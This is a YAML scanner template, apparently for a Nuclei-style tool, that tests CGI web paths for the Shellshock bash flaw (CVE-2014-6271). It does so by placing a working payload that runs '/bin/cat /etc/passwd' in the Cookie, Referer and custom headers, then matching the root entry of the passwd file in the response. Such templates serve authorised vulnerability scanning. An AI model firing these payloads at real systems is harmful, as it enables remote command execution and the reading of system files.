id: cve-2014-6271
info:
  author: pentest_swissky
  description: Attempts to exploit the "shellshock" vulnerability (CVE-2014-6271 and
    CVE-2014-7169) in web applications
  name: Shellshock
  reference: '- http://www.kb.cert.org/vuls/id/252743

    - http://www.us-cert.gov/ncas/alerts/TA14-268A

    '
  severity: high
  tags: cve,cve2014,rce
requests:
- headers:
    Cookie: '() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd '
    Referer: '() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd '
    Shellshock: '() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd '
  matchers:
  - status:
    - 200
    type: status
  - part: body
    regex:
    - 'root:[x*]:0:0:'
    type: regex
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}'
  - '{{BaseURL}}/cgi-bin/status'
  - '{{BaseURL}}/cgi-bin/stats'
  - '{{BaseURL}}/cgi-bin/test'
  - '{{BaseURL}}/cgi-bin/status/status.cgi'
  - '{{BaseURL}}/test.cgi'
  - '{{BaseURL}}/debug.cgi'
